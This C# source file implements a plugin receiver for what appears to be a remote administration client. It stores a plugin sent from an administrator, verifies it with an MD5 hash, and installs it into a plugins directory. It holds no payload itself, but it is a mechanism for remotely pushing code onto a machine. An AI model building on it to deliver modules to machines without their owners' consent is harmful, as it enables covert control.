using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using Orcus.Config;
using Orcus.Shared.Utilities;

namespace Orcus.Connection
{
    public class PluginReceiver
    {
        private readonly byte[] _md5Hash;
        private readonly string _tempPath;

        public PluginReceiver(ushort administrationId, Guid guid, byte[] md5Hash, string version)
        {
            AdministrationId = administrationId;
            Guid = guid;
            _md5Hash = md5Hash;
            Version = version;

            _tempPath = FileExtensions.GetFreeTempFileName();
            FileStream = new FileStream(_tempPath, FileMode.CreateNew, FileAccess.ReadWrite);
        }

        public Guid Guid { get; }
        public ushort AdministrationId { get; }
        public string Version { get; }

        public FileStream FileStream { get; }

        public bool ImportPlugin()
        {
            try
            {
                FileStream.Position = 0;
                byte[] hash;
                using (var md5 = new MD5CryptoServiceProvider())
                    hash = md5.ComputeHash(FileStream);

                if (!hash.SequenceEqual(_md5Hash))
                {
                    Debug.Print("Hash values aren't equal");
                    return false;
                }

                var file = new FileInfo(Path.Combine(Consts.PluginsDirectory, $"{Guid:N}_{Version}"));
                if (file.Directory?.Exists == false)
                    file.Directory.Create();

                var length = FileStream.Length;
                FileStream.Close();

                if (file.Exists)
                {
                    if (file.Length == length)
                    {
                        byte[] fileHash;

                        using (var md5 = new MD5CryptoServiceProvider())
                        using (var stream = file.OpenRead())
                            fileHash = md5.ComputeHash(stream);

                        if (fileHash.SequenceEqual(_md5Hash))
                            return true;
                    }

                    //we try to replace the file
                    try
                    {
                        file.Delete();
                    }
                    catch (Exception)
                    {
                        return false;
                    }
                }

                File.Move(_tempPath, file.FullName);
            }
            finally
            {
                FileStream.Close();

                if (File.Exists(_tempPath))
                    File.Delete(_tempPath);
            }

            return true;
        }
    }
}